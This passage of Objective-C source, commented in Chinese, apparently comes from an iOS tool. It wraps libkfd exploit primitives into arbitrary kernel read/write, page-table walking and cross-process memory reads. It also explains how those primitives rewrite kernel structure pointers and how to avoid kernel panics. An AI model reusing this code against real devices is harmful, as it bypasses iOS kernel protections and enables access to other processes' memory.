        NSLog(@"[KernelMemory] kernel base scan missed; kread/kwrite still usable");
    }

    /*
     * 地址翻译层：走页表拿 PA，再用线性映射补回 KVA。
     * 这一步同时验证 kread 在原语层面真的可用。
     */
    km_locate_linear_map();
    NSLog(@"[KernelMemory] linear map %@, pmap = %#llx%@",
          g_linear_map_valid ? @"ready" : @"unresolved",
          (unsigned long long)g_current_pmap,
          g_linear_map_valid ? @""
                             : @" —— 读路径闸门生效：km_read_process / km_write_process "
                               @"一律直接失败（预期安全态，不是故障）");

    /*
     * procForPid 自证：自己进程必须能查到，且 p_pid 对得上。
     *
     * 注意这条自证在 KM_ENABLE_PLIST_WALK = 0 之后**能力变弱了**，不能当它还是
     * 原来那个判据：短路命中返回的就是 current_proc 本身，所以比较必然成立，
     * 剩下的唯一信号是 `selfProc == 0`（等价于 current_proc == 0，即 info_run
     * 没反查出自己的 proc）。换句话说它不再能验证"版本表里的 p_list / p_pid
     * 偏移对不对"—— 那要链表遍历，而遍历已停用。这一点写出来，免得下次有人
     * 看到 "OK" 就以为整条定位链验过了。
     */
    uint64_t selfProc = km_proc_for_pid(kfd->info.env.pid);
    NSLog(@"[KernelMemory] procForPid(self=%d) = %#llx %@",
          kfd->info.env.pid, (unsigned long long)selfProc,
          (selfProc == kfd->info.kaddr.current_proc) ? @"OK" : @"MISMATCH");

    /*
     * 到这里才算对外就绪。放在最后一行，是为了让 km_ready() 在
     * km_locate_linear_map 跑完之前一直返回 false ——
     * 否则别的线程会在这些内部 kread 还在进行时并发进来，而 libkfd 后端
     * 不是线程安全的（kread 改自己的 psemnode，kwrite 与 kread 共用缓冲）。
     */
    g_kernel_ready = true;

    return true;
}

bool km_ready(void)
{
    return g_kernel_ready && (g_handle != 0);
}

uint64_t km_kernel_base(void)
{
    return g_kernel_base;
}

/*
 * ── 给 KernelSlide 的两个只读接线（声明与理由见 KernelMemory.h）──
 *
 * 两者都只是"把已经存在的值读出来"：不发 kread、不写状态，也不参与本文件
 * 任何一条读路径，所以它们不改变 km_init / km_read / km_translate 的行为。
 * 刻意返回 0 而不是让调用方自己去解引用 g_handle：`struct kfd` 的布局只应
 * 出现在本文件里。
 */
uint64_t km_current_proc(void)
{
    if (g_handle == 0) {
        return 0;
    }
    return ((struct kfd *)g_handle)->info.kaddr.current_proc;
}

uint64_t km_proc_fd_ofiles_offset(void)
{
    if (g_handle == 0) {
        return 0;
    }
    /*
     * dynamic_info(...) 展开成 kern_versions[kfd->info.env.vid].xxx，是靠名字
     * 捕获局部变量 `kfd` 的宏（与 km_translate 里那处注记同因），所以这里必须
     * 有一个同名局部变量。
     */
    struct kfd *kfd = (struct kfd *)g_handle;
    return dynamic_info(proc__p_fd__fd_ofiles);
}

/*
 * ── 给 KernelPhysWindow 的四个只读接线（声明与理由见 KernelMemory.h）──
 *
 * 前三个只是"把已经存在的值读出来"：不发 kread、不写状态，也不参与本文件
 * 任何一条读路径。
 */
uint64_t km_task_map_offset(void)
{
    if (g_handle == 0) {
        return 0;
    }
    /* dynamic_info 是靠名字捕获局部变量 `kfd` 的宏，见 km_proc_fd_ofiles_offset。 */
    struct kfd *kfd = (struct kfd *)g_handle;
    return dynamic_info(task__map);
}

uint64_t km_proc_object_size(void)
{
    if (g_handle == 0) {
        return 0;
    }
    struct kfd *kfd = (struct kfd *)g_handle;
    return dynamic_info(proc__object_size);
}

uint64_t km_vm_map_pmap_offset(void)
{
    /*
     * 纯编译期常量，不查表、不看内核层是否就绪 —— 版本表里没有这一项，
     * 布局的唯一来源是 static_info.h 的结构体定义（与上游 info.h:151
     * 的 static_kget(struct _vm_map, pmap, ...) 同源）。
     */
    return (uint64_t)offsetof(struct _vm_map, pmap);
}

/*
 * 内核页大小。
 *
 * 为什么用 sysctl 而不是去内核里读 `_vm_kernel_page_size`：后者要先有 XPF 解符号、
 * 再有 kread，而页大小在**建任何东西之前**就要用（窗口地址的公式与页表几何都靠它）。
 * 引入那条依赖等于让"探路"这一步也被 XPF 卡住。
 *
 * `hw.pagesize` 在 iOS 上就是内核页大小（同一个 sysctl 也被 libkfd 的
 * pages() 宏间接依赖：common.h:44 用 ARM_PGBYTES=16K 硬编码，那是本工程
 * 只支持 16K 机型的另一个原因，见 KernelPhysWindow.m 的几何判据）。
 */
uint64_t km_kernel_page_size(void)
{
    /*
     * hw.pagesize 是 int（4 字节），**不能**拿 uint64_t 去接：那样 sysctl 只会写
     * 低 4 字节并把 size 改回 4，高 4 字节保留缓冲区原值 —— 一旦当初栈上是垃圾，
     * 得到的就是一个"看似合理的巨大页大小"，而页大小要参与决定页表几何，
     * 带着错值往下走就是把没验证的地址喂给 kread。用 u32 接、再零扩展。
     */
    uint32_t value = 0;
    size_t size = sizeof(value);
    if (sysctlbyname("hw.pagesize", &value, &size, NULL, 0) != 0) {
        return 0;
    }
    return (uint64_t)value;
}

/*
 * ── 页下溢闸门 ──
 *
 * kread/kwrite 都不是"直接读那个地址"：它们先把一个**内核结构体的指针字段**
 * 改写成 `目标地址 − 某个字段偏移`，再让内核按它自己的语义去解引用。于是内核
 * 实际访问的**最低地址**是 `目标地址 − delta`；只要目标地址的**页内偏移小于
 * delta**，那个减法就落到**前一页**上。
 *
 * 前一页未映射时，内核在 same-EL 的 data abort 上默认没有 fault-recovery
 * handler —— 结果不是本进程崩，而是**整机 panic**。实测形态：esr = 0x96000007
 * （EC 0b100101 same-EL data abort、DFSC 0b000111 level-3 translation fault）、
 * `far == x8 + 8`，其中 x8 就是那个被改写过的结构体指针，且它的低 4 位非 0
 * （说明它是内核自己算出来的 pinfo，不是我们送进去的地址）。
 * 关键一点：**这与"目标地址自己是否映射"无关 —— 目标是页对齐就一定会中招。**
 *
 * 读路径 delta 的两个来源：
 *   · kread_sem_open.h:147 —— `u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_uid);`
 *   · static_info.h:556-567 —— struct pseminfo { u32 psem_flags; u32 psem_usecount;
 *     u16 psem_mode; u32 psem_uid; ... }。psem_mode 是 u16，psem_uid 因此按
 *     4 字节对齐到 0x0C（不是 0x0A）。
 * 上游自己也记着这件事：kread_sem_open.h:163-166 只声明 32 位那条
 * "guaranteed to not underflow a page"，言下之意 64 位这条会下溢页。
 */
#define KM_PAGE_UNDERFLOW_KREAD 0x0C

/*
 * 写路径 delta 的两个来源（**与读路径不同，不是 0x0C**）：
 *   · kwrite_dup.h:126 —— `u64 new_fp_guard = kaddr - offsetof(struct fileproc_guard, fpg_guard);`
 *   · static_info.h:311-314 —— struct fileproc_guard { u64 fpg_wset; u64 fpg_guard; }，
 *     两个字段都是 u64，故 offsetof(fpg_guard) = 0x08。
 * 写路径改的是 fp_guard（fileproc 的内联字段，见 static_info.h:316-324），
 * 内核随后按 struct fileproc_guard 的语义从 `kaddr − 0x08` 起访问。
 * 但写路径并不只下溢 0x08：kwrite_dup.h:110 在真正写入之前，先用**同一个 kaddr**
 * 走了一次 8 字节 kread → 那一步仍按 KM_PAGE_UNDERFLOW_KREAD 下溢。
 * 所以 km_write 的闸门取两者较大者（见该函数内的取值处），
 * 只按 0x08 放行会在页内偏移 0x08..0x0B 的地址上漏掉那次 kread。
 */
#define KM_PAGE_UNDERFLOW_KWRITE 0x08

/*
 * 页下溢闸门：要求 [addr, addr+len) 内**每一个被实际访问的 8 字节字的地址**
 * 都满足「页内偏移 >= underflow」。
 *
 * 为什么按字而不是只看首地址：krkw.h:8-31 的 kread_from_method / kwrite_from_method
 * 都是按 sizeof(u64) 步进逐个字搬的，每个字的地址各自可能落在页首 delta 以内；
 * 只验首地址会漏掉后面那些字（len > 8 时尤其明显）。
 *
 * 页大小一律取 km_kernel_page_size()（iOS 上 0x4000），不硬编码 —— 页大小取不到、
 * 或不是 2 的幂（掩码法就不成立）时返回 false：这是安全失败，
 * 少读一次远好过一次整机 panic。
 */
static bool km_is_page_underflow_safe(uint64_t addr, uint64_t len, uint64_t underflow)
{
    const uint64_t page_size = km_kernel_page_size();
    if (page_size == 0 || (page_size & (page_size - 1)) != 0) {
        NSLog(@"[KernelMemory] page underflow gate: page size unavailable (%llu), refused addr=%#llx len=%llu",
              (unsigned long long)page_size, (unsigned long long)addr, (unsigned long long)len);
        return false;
    }

    const uint64_t page_mask = page_size - 1;

    for (uint64_t offset = 0; offset < len; offset += sizeof(uint64_t)) {
        const uint64_t word_addr = addr + offset;

        /* 地址在区间顶部回绕时按不合法处理（内层循环不再可信）。 */
        if (word_addr < addr) {
            NSLog(@"[KernelMemory] page underflow gate: address wrap at addr=%#llx offset=%llu, refused",
                  (unsigned long long)addr, (unsigned long long)offset);
            return false;
        }

        const uint64_t page_offset = word_addr & page_mask;
        if (page_offset < underflow) {
            NSLog(@"[KernelMemory] page underflow gate: addr=%#llx page_offset=%#llx underflow=%#llx page_size=%#llx"
                  " refused (kernel would touch addr - underflow = the previous page)",
                  (unsigned long long)word_addr,
                  (unsigned long long)page_offset,
                  (unsigned long long)underflow,
                  (unsigned long long)page_size);
            return false;
        }
    }

    return true;
}

bool km_read(uint64_t addr, void *out, uint64_t len)
{
    if (g_handle == 0 || out == NULL || len == 0) {
        return false;
    }
    if (!km_is_kernel_address(addr)) {
        return false;
    }
    /*
     * 页下溢闸门（理由与两个 delta 的来源见 KM_PAGE_UNDERFLOW_KREAD 那段注释）。
     * 一次覆盖整个 [addr, addr+len)：kread 内部按 8 字节步进，中途任何一个字的
     * 地址都可能踩到前一页，所以必须在发第一个 kread 之前就整段判掉。
     */
    if (!km_is_page_underflow_safe(addr, len, KM_PAGE_UNDERFLOW_KREAD)) {
        return false;
    }

    /*
     * 走公共 kread()（按选定后端分发，不能再写死 kread_sem_open_kread_u64）。
     * kread 内部的 kread_from_method 只搬 size/8 个整字，尾部不足 8 字节会丢，
     * 所以这里对尾部单独取一整个字再截断，避免把目标地址后面的字节写进调用方缓冲。
     */
    uint8_t *cursor = (uint8_t *)out;
    uint64_t remaining = len;

    while (remaining >= sizeof(uint64_t)) {
        kread((u64)g_handle, addr, cursor, sizeof(uint64_t));
        cursor += sizeof(uint64_t);
        addr += sizeof(uint64_t);
        remaining -= sizeof(uint64_t);
    }

    if (remaining > 0) {
        uint64_t tail = 0;
        kread((u64)g_handle, addr, &tail, sizeof(tail));
        memcpy(cursor, &tail, (size_t)remaining);
    }

    return true;
}

/*
 * 读一个内核 64 位字。
 *
 * `*ok` 的语义要说清：它**不是**"kread 报告成功"——`kread` 返回 void，
 * 失败时内部 assert 或静默返回，调用方拿不到任何状态。所以这里能给出的
 * 最强保证是"地址形态合法 且 两次读到同一个值"。
 *
 * 复读一致为什么够用：读失败时 kread 要么落在悬空 PTE 对应的垃圾上、
 * 要么原样不动目标缓冲（此时是上一次的残留），两种情况连续两次都取到
 * 同一值的概率极低。代价是每次读翻倍 —— 所以只给 km_read64 用，
 * 走量的 km_read 不做这件事。页表遍历每级一次，量很小，值得。
 */
uint64_t km_read64(uint64_t addr, bool *ok)
{
    if (ok) {
        *ok = false;
    }
    if (g_handle == 0 || !km_is_kernel_address(addr)) {
        return 0;
    }
    /* 页下溢闸门：单字读，*ok 保持 false 即既有失败语义。 */
    if (!km_is_page_underflow_safe(addr, sizeof(uint64_t), KM_PAGE_UNDERFLOW_KREAD)) {
        return 0;
    }

    uint64_t first = 0;
    kread((u64)g_handle, addr, &first, sizeof(first));

    uint64_t second = 0;
    kread((u64)g_handle, addr, &second, sizeof(second));

    if (ok) {
        *ok = (first == second);
    }
    return first;
}

bool km_write(uint64_t addr, const void *in, uint64_t len)
{
    if (g_handle == 0 || in == NULL || len == 0) {
        return false;
    }
    if (!km_is_kernel_address(addr)) {
        return false;
    }
    /* kwrite 按 8 字节粒度写入，长度不是 8 的倍数就没有定义。 */
    if ((len % sizeof(uint64_t)) != 0) {
        return false;
    }

    /*
     * 页下溢闸门。取读/写两个下溢量的**较大者**：写路径自身是
     * KM_PAGE_UNDERFLOW_KWRITE，但 kwrite_dup.h:110 在写入前会先用同一个 kaddr
     * 做一次 8 字节 kread，那一步是 KM_PAGE_UNDERFLOW_KREAD。
     */
    const uint64_t underflow = (KM_PAGE_UNDERFLOW_KREAD > KM_PAGE_UNDERFLOW_KWRITE)
                                   ? KM_PAGE_UNDERFLOW_KREAD
                                   : KM_PAGE_UNDERFLOW_KWRITE;
    if (!km_is_page_underflow_safe(addr, len, underflow)) {
        return false;
    }

    /*
     * 走公共 kwrite()：同样按选定后端分发，不再写死 kwrite_dup_kwrite_u64。
     * kwrite 内部按 8 字节粒度写入，所以长度必须是 8 的倍数。
     */
    kwrite((u64)g_handle, (void *)in, addr, len);

    return true;
}

void km_self_test(char *out, size_t outSize)
{
    if (out == NULL || outSize == 0) {
        return;
    }
    out[0] = '\0';

    if (g_handle == 0) {
        snprintf(out, outSize, "kernel rw: not ready");
        return;
    }

    /*
     * ============ 本函数里的内核访问逐条穷举（与 km_init 那份清单配套）============
     *
     * ① magic 检查：km_read(g_kernel_base, ...)。
     *    地址来自 g_kernel_base。扫描已停用，所以它现在恒为 0，会直接走
     *    "skipped (no kernel base)" 分支 —— **一次 kread 都不发**。
     *    将来重新打开扫描时要注意：这条读的安全性完全继承扫描的结果，
     *    而扫描本身正是被判定为"不可验证"才停用的。
     *
     * ② dynamic_kget(proc__p_pid, current_proc)：读 current_proc + 版本表偏移。
     *    地址来自 info_run，与 km_init 里那些读同级；偏移来自 dynamic_info 的
     *    版本表。它不使用 g_linear_delta，所以 delta 闸门管不到它 ——
     *    残余风险只剩"版本表偏移填错"，那属于表数据问题（见 preflight 的第 2 项
     *    检查与 verify_dynamic_info.py）。
     *
     * ③ PTE 自检：km_page_table_walk + km_pte_for，最后 `pte_PA + g_linear_delta`
     *    交给 km_read64。这是全文件唯一一处绕过 km_translate / km_read_process
     *    闸门、直接做 `pa + delta` 的地方，所以它自己挂了外层 g_linear_map_valid
     *    闸门 —— 基准没验通就整段跳过（当前设备上的**预期**结果就是跳过）。
     *
     * ④ walk(kernel_proc)：km_page_table_walk(g_current_pmap, kernel_proc)。
     *    这处调用没有外层闸门，但 walk 自己的**入口闸门**直接返回 false，
     *    所以它**一次 kread 都不发** → 输出 "MISS"。这是安全的。
     *
     * ⑤ self-read：km_read_process(selfPid, ...) → 入口 g_linear_map_valid 闸门，
     *    基准未验通时直接返回 false → 显示 "FAIL"，不下探到页表。
     *
     * ⑥ procForPid 状态行：km_proc_lookup_blocker() —— **不是**内核访问，
     *    只读编译期开关，所以它在上面这套计数里是零 kread。写进清单是因为它
     *    回答的是同一类问题："这一层现在还剩下什么能力"。它的存在理由就是让
     *    面板能区分「p_list 遍历被停用」与「进程不存在」——两者在上层文案里
     *    目前长得一样，处置却完全相反。
     *
     * 结论：本函数在基准未验通时的输出会退化成
     *   magic: skipped / procForPid: DISABLED / walk(kernel_proc)=MISS /
     *   linear=UNRESOLVED / self-read FAIL
     * —— 这是**预期安全态**，不是功能故障。
     */

    struct kfd *kfd = (struct kfd *)g_handle;
    size_t used = 0;

    /*
     * ── 本函数所有追加都按「**实际写入**的字节数」记账（snprintf + strlen），
     *    不能用 snprintf 的返回值 ──
     *
     * 为什么：snprintf 返回的是"空间够的话本来会写多少"，**截断时这个返回值大于
     * 实际可用空间**。一旦 used 因此越过 outSize，后面那句 `outSize - used` 在
     * size_t 上回绕成天文数字，紧接着的 snprintf 就往缓冲区外面写 ——
     * 而这块缓冲是 AppDelegate 里 512 字节的数组（`km_self_test(&buffer, 512)`），
     * 溢出就是踩别人的内存。
     *
     * 这个越界是**本次改动带出来的**，不是原来就有的（这点要说准，免得日后
     * 被当成"历史遗留"糊过去）：原输出的 `used += snprintf` 只有 header(≈82) /
     * magic(31) / pte 行(≤191) 三处，量级叠起来仍在 512 以内；
     * 新加的 procForPid 行最长 ~190 字节，加上 pte 那行就能越过
     * （82 + 31 + 190 + 44 + 191 = 538），于是回绕发生。
     * 所以没有只把自己的行压短了事，而是把这几处一并改成 strlen 记账 ——
     * 记实际写入字节天然安全：snprintf 保证在给定空间内写 NUL 结尾，
     * 故 used 恒 ≤ outSize - 1，后面所有 `outSize - used` 都不会回绕，
     * 最坏结果只是报告被截断（截断只是少几行诊断，不会踩内存）。
     */
    snprintf(out + used, outSize - used,
             "current_proc=%#llx kernel_proc=%#llx kernel_base=%#llx\n",
             (unsigned long long)kfd->info.kaddr.current_proc,
             (unsigned long long)kfd->info.kaddr.kernel_proc,
             (unsigned long long)g_kernel_base);
    used += strlen(out + used);

    /*
     * 锚点校验：kernel base 处必须是小端 MH_MAGIC_64，且紧跟的 cputype 为 arm64。
     * 两项同时成立才能说明 kread 读到的确实是那个 Mach-O 头，
     * 而不是一串看起来合理的垃圾。
     */
    if (outSize > used) {
        char line[192] = {};
        if (g_kernel_base == 0) {
            snprintf(line, sizeof(line), "magic: skipped (no kernel base)");
        } else {
            uint32_t header[2] = {};
            if (!km_read(g_kernel_base, header, sizeof(header))) {
                snprintf(line, sizeof(line), "magic: read failed");
            } else {
                snprintf(line, sizeof(line), "magic=%#x cputype=%#x  %s",
                         header[0], header[1],
                         (header[0] == 0xFEEDFACF) ? "OK" : "MISMATCH");
            }
        }
        snprintf(out + used, outSize - used, "%s\n", line);
        used += strlen(out + used);
    }

    /*
     * procForPid 能力自述 —— 一行把"这一层被编译期开关整体停用"与"某个进程
     * 真的不存在"分开。上层（MemoryProbe）目前把 km_proc_for_pid
     * 的 0 一律写成「找不到该进程的 proc」，那份文案本轮不动，所以面板上唯一
     * 能说清真相的地方就是这一行 —— 它常驻首行（AppDelegate.kernelNote
     * 存的就是这份报告）。纯用户态读取：只查编译期开关，不发 kread。
     */
    if (outSize > used) {
        const char *blocker = km_proc_lookup_blocker();
        if (blocker == NULL) {
            snprintf(out + used, outSize - used,
                     "procForPid: 可用（p_list 遍历启用）\n");
        } else {
            /*
             * 不再额外加 "DISABLED ——" 前缀：原因文本自己就以"已停用"开头，
             * 多那 19 个字节是拿报告预算换的（512 字节见上）。
             */
            snprintf(out + used, outSize - used,
                     "procForPid: %s\n", blocker);
        }
        used += strlen(out + used);
    }

    /* 再按偏移解引用一次 current_proc 的 pid，确认 dynamic_info 偏移可用。 */
    if (kfd->info.kaddr.current_proc && outSize > used) {
        i32 pid = (i32)dynamic_kget(proc__p_pid, kfd->info.kaddr.current_proc);
        snprintf(out + used, outSize - used,
                 "current_proc->p_pid=%d (expect %d) %s",
                 pid, kfd->info.env.pid,
                 (pid == kfd->info.env.pid) ? "OK" : "MISMATCH");
        used += strlen(out + used);
    }

    /*
     * PTE 自检 —— physrw 的第一阶段，**全程零风险**。
     *
     * 目标：确认「能定位某条 PTE 自身」并「能原值写回」。
     * 用自己进程一块已知的栈地址：
     *       ① 走 km_page_table_walk 拿它描述的物理页（VA→PA 链路）
     *       ② 走 km_pte_for 拿那条 PTE 自身的 PA（physrw 改的正是这个）
     *       ③ 把 ①的物理页经线性映射补回 KVA，用 kwrite 把 ②的 PTE 原值写回
     *       ④ 重读 ②，必须还是原值
     *
     * ③ 写回的是**读到的同一个值**，所以逻辑上不改变任何映射 —— 即便哪一步
     * 算错了也不会伤到自身，最坏是把同一个值写到别处。这一步验证的是
     * "PTE 的位置算对了"，而不是"改动能生效"（后者要配 TLB 刷新，属于第二阶段）。
     *
     * 之所以用栈变量而不是 malloc：栈页必然已映射、必然是小页（16 KB），
     * 不会撞上 L1/L2 大页那条 walk 与 pte_for 都拒绝的路径。
     *
     * 入口多挂一个 g_linear_map_valid：下面那句 `pte_PA + g_linear_delta` 是
     * 本文件里**唯一**绕过 km_translate / km_read_process 闸门、把 `pa + delta`
     * 直接交给 km_read64 的地方。delta 未被采信时它是 0，于是这一次 kread 拿到
     * 的是 pte_PA 本身当 KVA —— 而 pte_PA 是个正常的物理地址（几百 MB 量级），
     * 一旦它恰好低于 VM_MIN_KERNEL_ADDRESS，km_read64 里的 km_is_kernel_address
     * 就会**放行**，内核随即对着一个未映射地址取数 —— 与 bug_type 210 那份
     * panic 形态完全一致（far 低于 VM_MIN_KERNEL_ADDRESS）。
     * 自检只是诊断，不值得为它冒彩屏的险：基准没验通就整段跳过。
     */
    if (g_current_pmap != 0 && g_linear_map_valid && outSize > used) {
        char line[256] = {};
        volatile uint64_t stackProbe = 0x5AFE5AFE5AFE5AFEULL;
        (void)stackProbe;
        uint64_t probeVa = (uint64_t)(uintptr_t)&stackProbe;

        uint64_t page_PA = 0, pte_PA = 0;
        const bool gotPA = km_page_table_walk(g_current_pmap, probeVa, &page_PA);
        const bool gotPTE = km_pte_for(g_current_pmap, probeVa, &pte_PA);

        if (!gotPA || !gotPTE) {
            /*
             * 走到这里就说明基准没验通（外层的 g_linear_map_valid 闸门）——
             * 这也是本条自检在设备上的**预期**结果：宁可它 FAIL，也不要拿
             * `pte_PA + 0` 去 kread。
             */
            snprintf(line, sizeof(line),
                     "pte: walk=%s pte_for=%s  va=%#llx  (FAIL，未验通基准=预期安全态)",
                     gotPA ? "OK" : "FAIL", gotPTE ? "OK" : "FAIL",
                     (unsigned long long)probeVa);
        } else {
            /* PTE 的 PA 经线性映射补回 KVA，才能落到它上面读出来 */
            const uint64_t pte_kva = pte_PA + g_linear_delta;

            bool ok = false;
            const uint64_t before = km_read64(pte_kva, &ok);
            if (!ok) {
                snprintf(line, sizeof(line),
                         "pte: pte_kva=%#llx 读失败 (FAIL)",
                         (unsigned long long)pte_kva);
            } else {
                /*
                 * 只读验证 —— 定位到这条 PTE 并把它读出来，到此为止。
                 *
                 * 早先这里还有一次 km_write(pte_kva, &before)「原值写回」，
                 * 注释把它当零风险，其实不成立：PTE 里的值是物理页号 + 权限位，
                 * 一旦 g_linear_delta 或 km_pte_for 任何一处算偏，就会把 A 页的
                 * PTE 值写进 B 页的 PTE —— 凭空造出一个错配映射，而这正是
                 * vm_map 被写坏、进而内核 panic 的经典入口。
                 *
                 * 何况 after == before 这个判据证明不了写入生效：kwrite 完全
                 * 没落地时它照样成立。收益为零、风险为真，所以写入整段去掉。
                 */
                bool ok2 = false;
                const uint64_t after = km_read64(pte_kva, &ok2);

                snprintf(line, sizeof(line),
                         "pte: va=%#llx pa=%#llx pte=%#llx walk=OK pte_for=OK "
                         "readonly %s value=%#llx",
                         (unsigned long long)probeVa,
                         (unsigned long long)page_PA,
                         (unsigned long long)pte_PA,
                         (ok2 && after == before) ? "OK" : "MISMATCH",
                         (unsigned long long)(ok2 ? after : 0));
            }
        }
        /*
         * 同上：按实际写入字节记账。这一行是 `used += snprintf` 那条链里最长的一条
         * （line[192]），它是把 used 顶过 outSize 的主力 —— 换掉它才真正关掉
         * 那个回绕溢出的可能。
         */
        snprintf(out + used, outSize - used, "%s\n", line);
        used += strlen(out + used);
    }

    /*
     * 地址翻译层自检：拿 kernel_proc 本身走一遍页表。
     * 它是内核地址，翻出来的 PA 经线性映射补回后必须还是它自己 ——
     * 这一步同时验证了 pmap 取链、页表走法、线性映射基准三件事。
     */
    if (outSize > used) {
        uint64_t probe = kfd->info.kaddr.kernel_proc;
        bool ok = false;
        uint64_t pa = 0;
        if (probe) {
            ok = km_page_table_walk(g_current_pmap, probe, &pa);
        }
        snprintf(out + used, outSize - used,
                 "\npmap=%#llx walk(kernel_proc)=%s pa=%#llx linear=%s",
                 (unsigned long long)g_current_pmap,
                 probe ? (ok ? "OK" : "MISS") : "SKIP",
                 (unsigned long long)pa,
                 g_linear_map_valid ? "OK" : "UNRESOLVED");
        used += strlen(out + used);
    }

    /*
     * 目标进程读自证 —— 一次同时验证三件事：
     *   ① 页表遍历（km_translate）
     *   ② 线性映射补回（pa + g_linear_delta）
     *   ③ 经内核读写目标进程用户态地址（km_read_process）
     * 做法：拿自己进程的 Mach-O 头，一条走 km_read_process（页表翻译），
     * 另一条直接拿本进程地址读同一段（普通内存访问），两者必须逐字节一致。
     * 自己进程走的是同一套代码路径，所以这个比对能真实暴露翻译是否正确。
     */
    if (outSize > used) {
        const int32_t selfPid = kfd->info.env.pid;
        const uint64_t mh = (uint64_t)(uintptr_t)&_mh_execute_header;

        uint32_t viaProcess[2] = {};
        bool readOK = km_read_process(selfPid, mh, viaProcess, sizeof(viaProcess));

        uint32_t viaLocal[2] = {};
        if (readOK) {
            const uint32_t *local = (const uint32_t *)(uintptr_t)mh;
            viaLocal[0] = local[0];
            viaLocal[1] = local[1];
        }

        snprintf(out + used, outSize - used,
                 "\nself-read %#llx: %s proc(magic=%#x cpu=%#x) local(magic=%#x cpu=%#x) %s",
                 (unsigned long long)mh,
                 readOK ? "OK" : "FAIL",
                 viaProcess[0], viaProcess[1],
                 viaLocal[0], viaLocal[1],
                 (readOK && viaProcess[0] == viaLocal[0] && viaProcess[1] == viaLocal[1])
                     ? "MATCH" : "MISMATCH");
    }
}

#pragma mark - 地址翻译层

/*
 * arm64 16 KB 页的三级表几何。
 * 这些常量不属于「逐版本变动」的那一类 —— 页表几何由硬件页大小决定，
 * 换内核版本不会变，所以写在这里是安全的。
 */
#define KM_PAGE_SHIFT 14ULL
#define KM_PAGE_SIZE (1ULL << KM_PAGE_SHIFT)
#define KM_PAGE_MASK (KM_PAGE_SIZE - 1)
#define KM_L1_SHIFT 36ULL
#define KM_L2_SHIFT 25ULL
#define KM_L3_SHIFT 14ULL
/*
 * L1 索引：bits 36..46，共 11 位。
 *
 * 原值 0x0000000ff0000000 只覆盖 bits 28..35（8 位），配 KM_L1_SHIFT=36 之后
 * (va & mask) >> 36 恒为 0 —— 对用户 VA 恰好蒙对（它们的 L1 索引本来就是 0），
 * 对内核 VA 必错。同仓库的 static_info.h 就有正确常量：
 *     #define ARM_16K_TT_L1_INDEX_MASK 0x00007ff000000000
 */
#define KM_L1_MASK 0x00007ff000000000ULL /* 11 bits at 36 */
#define KM_L2_MASK 0x0000000ffe000000ULL /* 11 bits at 25 */
#define KM_L3_MASK 0x0000000001ffc000ULL /* 11 bits at 14 */
#define KM_TTE_TYPE_BLOCK 0x0000000000000000ULL
#define KM_TTE_TYPE_TABLE 0x0000000000000002ULL
#define KM_TTE_TYPE_MASK 0x0000000000000002ULL
#define KM_TTE_VALID 0x0000000000000001ULL
#define KM_TTE_PA_MASK 0x0000fffffffff000ULL

/*
 * ============ 最后一级（L3）的描述符判据与 L1/L2 不同 ============
 *
 * arm64 用 bit1 区分描述符形态，但**同一形态在不同级别的含义相反**：
 *   L1 / L2：bit1 = 0 → 块描述符（大页），bit1 = 1 → 表描述符（下一级表）
 *   L3     ：bit1 = 0 → 不是叶子（L3 之下无处可去），bit1 = 1 → 页描述符
 * 所以「是叶子」的判据是 (entry & 2) == 0（L1/L2）与 (entry & 2) == 2（L3），
 * 两者互为反相。**三级共用一套判据必然错**：L3 页描述符的 bit1 恒为 1，
 * (entry & 2) == 0 永不成立，于是每一处下钻到 L3 的翻译都以失败收场
 * —— 这正是设备上 pte: walk=FAIL / walk(kernel_proc)=MISS pa=0 的主因。
 *
 * 上游 perf.h 的 vtophys 就是逐级换判据的（L1/L2 见 :270-287，L3 见 :288-296）：
 *     L1/L2：valid_mask = ARM_TTE_VALID (0x1)，type_mask = ARM_TTE_TYPE_MASK (0x2)，
 *            type_block = ARM_TTE_TYPE_BLOCK (0x0)
 *     L3   ：valid_mask = ARM_PTE_TYPE_VALID (0x3)，type_mask = ARM_PTE_TYPE_MASK (0x2)，
 *            type_block = ARM_TTE_TYPE_L3BLOCK (0x2)
 * 常量出处 Aether/libmemrw/kfd/libkfd/info/static_info.h:30 / :31 / :32，以及
 * :50 / :51 / :53；本组宏与其同值，改名只是为了不与 libkfd 的命名混在一起。
 *
 * valid 也一并随级变化：L3 要求 bit0、bit1 **都**为 1（0x3）。只查 bit0 会放过
 * (entry & 3) == 1 这种既不是页描述符、也不是有效表项的形态，之后拿它算 PA
 * 就是凭垃圾位输出一个地址。上游 perf.h:308 同样是 `& valid_mask`，不是 `& 1`。
 *
 * 一个已知缺口，刻意与上游保持一致：ARM_PTE_COMPRESSED / _ALT（bit63 / bit62，
 * static_info.h:47-48）这类压缩表项没有专门排除 —— 上游 perf.h 也没排除。
 * 也就是说撞上它时两边都会按朴素页描述符算出一个不可信的 PA。本工程没在设备上
 * 验证过压缩页，所以按上游行为对齐（宁可和参考实现错得一样，也不自作聪明）。
 */
#define KM_PTE_TYPE_VALID 0x0000000000000003ULL
#define KM_PTE_TYPE_MASK 0x0000000000000002ULL
#define KM_TTE_TYPE_L3BLOCK 0x0000000000000002ULL

/*
 * 各级的级内偏移掩码（offmask）与对应的 PA 掩码。
 *
 * 上游 perf.h:313 落块/页描述符时是一行：
 *     pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
 * 这里的 offmask 是**当前这一级**的（perf.h:262 / :271 / :280 / :289 逐级取），
 * 不是固定值 —— 因为块描述符描述的是「一整块」，它只存块首，块内偏移只能从
 * VA 取回：
 *     L1 块 = 2^36 = 64GiB（static_info.h:62 ARM_16K_TT_L1_SIZE），
 *             掩掉低 36 位 → static_info.h:63 ARM_16K_TT_L1_OFFMASK
 *     L2 块 = 2^25 = 32MiB（static_info.h:67），
 *             掩掉低 25 位 → static_info.h:68 ARM_16K_TT_L2_OFFMASK
 *     L3 页 = 2^14 = 16KiB（static_info.h:72），
 *             掩掉低 14 位 → static_info.h:73 ARM_16K_TT_L3_OFFMASK
 *
 * 原先三级共用 KM_PAGE_MASK（14 位），后果分两头：
 *   1. 往下走：L1 / L2 大页丢掉 VA 的级内偏移，PA 指向块首而不是目标页。
 *      内核线性映射区常用大页，所以这条不是理论问题，是真会生效的错。
 *   2. 往上看：见下面的 PA 掩码。
 */
#define KM_L1_OFFMASK 0x0000000fffffffffULL /* 36 bits，与 static_info.h:63 同值 */
#define KM_L2_OFFMASK 0x0000000001ffffffULL /* 25 bits，与 static_info.h:68 同值 */
